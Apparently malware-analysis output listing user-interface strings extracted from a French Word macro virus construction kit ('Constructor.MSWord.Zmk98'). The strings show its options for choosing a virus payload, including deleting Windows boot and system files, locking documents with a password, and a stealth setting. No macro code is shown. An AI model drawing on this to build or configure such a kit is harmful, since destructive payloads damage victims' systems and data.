Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Menu Macros:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le titre de la bo�te � message:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le message que doit afficher la bo�te:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le titre de la bo�te � message:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le message que la bo�te doit afficher:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Menu Mod�les et Compl�ments:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Menu Visual Basic Editor:�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le titre de la bo�te � message:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le message que doit afficher la bo�te:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Voulez-vous afficher un message lors de l'acc�s au menu suivant:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�- Mod�les et Compl�ments:�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�- Macros:�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�- Visual Basic Editor:N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le titre de la bulle pour l'assistant:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer  le message que doit afficher l'assistant:d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Quel(s) fichier(s) voulez-vous effacer ?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Autoexec.bat
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Config.sysat
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Command.comt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Msdos.sysomt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Io.sys@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C:\Windows\*.ini
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�pertoire courantH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C:\Windows\Command\*.*@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le mot de passe que vous voulez pour le
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�document:�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez retaper votre mot de passe pour le confirmer:e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veulliez entrer le titre de la bo�te � message:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le message � afficher:O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez choisir le type charge pour votre virus:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Boite � message
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Effacement fichier(s) syst�me(s)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mettre un mot de passeJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Afficher l'assistant
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Aucune@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�capitulatif des donn�es:l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom du virus:�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Fichier de sauvegarde:c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Furtif:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Type de macro:l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pour le mod�le:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pour le document:�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Type de charge:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�pertoire de sauvegarde:�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Welcome/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Bienvenue dans ce kit�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Welcome/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Welcome/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�de cr�ation....
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Welcome/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Welcome/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Compilation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Compilation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Compilation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
